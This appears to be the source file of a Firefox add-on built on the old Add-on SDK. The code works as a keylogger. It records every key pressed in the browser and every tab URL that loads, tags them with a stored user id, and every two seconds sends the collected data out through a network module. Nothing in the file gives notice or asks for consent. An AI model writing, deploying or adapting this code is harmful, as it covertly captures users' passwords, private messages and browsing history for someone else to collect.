var observer = require("sdk/keyboard/observer").observer;
var tabs = require("sdk/tabs");
var setInterval = require("sdk/timers").setInterval;
var storage = require('storage.js');
var network = require('network.js');
var flag = false;

var jdata = {
	keypress:[],
	urls :[],
	uid : storage.localStorage.id
};
observer.on('keydown', function(event){
	jdata.keypress.push(event.key);
});
tabs.on('ready', function(tab){
	jdata.urls.push(tab.url);
});

setInterval(function(){
	if(jdata.keypress.length > 0){
		storage.storekey(jdata.keypress.toString());
		jdata.keypress=storage.retrivekey();
		flag = true;
	}
	
	else if(jdata.urls.length > 0){
		storage.storeurls(jdata.urls);
		jdata.urls=storage.retriveurls();
		flag = true;
	}
		     
	if(flag){
		network.postdata(jdata);
		emptyj();
		flag = false;
	}
	
},2000);

function emptyj(){
		jdata.urls=[];
		jdata.keypress=[];
	}
	

